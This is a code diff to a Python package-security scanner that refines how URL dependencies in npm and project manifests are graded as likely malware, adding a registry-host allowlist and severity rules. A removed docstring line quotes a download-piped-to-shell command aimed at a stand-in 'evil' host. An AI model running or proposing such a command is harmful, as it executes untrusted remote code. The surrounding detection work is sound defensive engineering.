@@ -437,7 +437,7 @@ class ManifestScripts:
         """Whether a lifecycle command is a recognised build step.
 
         Compared against the whole command after stripping shell chaining, so
-        `node-gyp rebuild && curl evil | sh` is not waved through by its first
+        `node-gyp rebuild && <a download piped to a shell>` is not waved through by its first
         clause -- which is how an allowlist that matched a prefix of the raw string
         would have been defeated in one move. `npm run X` is judged by what script `X` runs,
         three levels deep at most; a tool is judged by where its package comes from.
@@ -541,6 +541,18 @@ class ManifestScripts:
         "gitlab.com",
         "bitbucket.org",
     )
+    #: The package registries' own download hosts: a URL to one is the registry, spelled out.
+    _REGISTRY_HOSTS: ClassVar[frozenset[str]] = frozenset(
+        {
+            "registry.npmjs.org",
+            "registry.yarnpkg.com",
+            "registry.npmmirror.com",
+            "files.pythonhosted.org",
+            "pypi.org",
+            "static.crates.io",
+            "proxy.golang.org",
+        }
+    )
     #: A source-archive path a code host serves for a ref.
     _SOURCE_ARCHIVE: ClassVar[re.Pattern[str]] = re.compile(
         r"/(?:repository/archive|-/archive|archive|tarball|zipball)(?:/|\.tar\.gz|\.zip|\?)"
@@ -557,14 +569,21 @@ class ManifestScripts:
     def _remote_tarball(
         spec: str, path: str, ctx: ScanContext, checksummed: bool
     ) -> tuple[str, str, Severity] | None:
-        """(rule, host, severity) when a published npm package's own manifest depends on an
-        http(s) URL off any registry.
+        """(rule, host, severity) when a manifest depends on an http(s) URL off any registry, in the
+        shape malware uses.
 
         Measured on the 193 malware samples with URL dependencies and 1,158 benign units with
         them (review 98, REC-3): the malware's URLs are version-less endpoints on lookalike
         artifact hosts (`packages.storeartifact.com/npm/<name>`) or raw addresses, served fresh on
         every install; the benign ones are GitHub archives and release tarballs on a vendor's CDN
         (`cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz`). Those two are reported below the gate.
+
+        A published npm package's own manifest is graded in full. A project's manifest (a scanned
+        directory or repository, any ecosystem: a server cloned and run from its source declares
+        its dependencies there) is graded one step lower, and only in the malware's shape: a
+        version-less endpoint off any code host is a warning, a raw address or a paste, webhook
+        or tunnel service a high one; a code-host archive or a versioned release stays the
+        source policy's to report, as a project's own deliberate choice.
         """
         from cordon_scanner.analysis.shared.destinations import ALL_HOSTS, INTERACTION_HOSTS
 
@@ -572,17 +591,20 @@ class ManifestScripts:
         own_manifest = member == "package/package.json" or (
             ctx.package_distribution and member == "package.json"
         )
-        if not own_manifest or checksummed:
+        project = not ctx.package_distribution and "!" not in path
+        if not (own_manifest or project) or checksummed:
             return None
         found = re.match(r"https?://(?:[^@/]{1,200}@)?([^/:?#]{1,253})", spec.strip())
         if found is None:
             return None
         host = found.group(1).lower()
-        if host in ("registry.npmjs.org", "registry.yarnpkg.com", "registry.npmmirror.com"):
+        if host in ManifestScripts._REGISTRY_HOSTS:
             return None
         if RAW_IP_HOST.fullmatch(host) is not None or any(
             host == known or host.endswith("." + known) for known in ALL_HOSTS | INTERACTION_HOSTS
         ):
+            if not own_manifest:
+                return REMOTE_TARBALL_RULE, host, Severity.HIGH
             return MALICIOUS_REMOTE_TARBALL_RULE, host, Severity.CRITICAL
         code_host = (
             any(host == h or host.endswith("." + h) for h in ManifestScripts._CODE_HOSTS)
@@ -592,8 +614,8 @@ class ManifestScripts:
             or ManifestScripts._SOURCE_ARCHIVE.search(spec.strip()) is not None
         )
         if code_host or ManifestScripts._VERSIONED_TARBALL.search(spec.strip()):
-            return REMOTE_TARBALL_RULE, host, Severity.MEDIUM
-        return REMOTE_TARBALL_RULE, host, Severity.HIGH
+            return (REMOTE_TARBALL_RULE, host, Severity.MEDIUM) if own_manifest else None
+        return REMOTE_TARBALL_RULE, host, Severity.HIGH if own_manifest else Severity.MEDIUM
 
     #: A git dependency pinned to a full commit: `github:owner/repo#<sha>`, `git+https://github.com/
     #: owner/repo.git#<sha>`, `owner/repo#<sha>`.
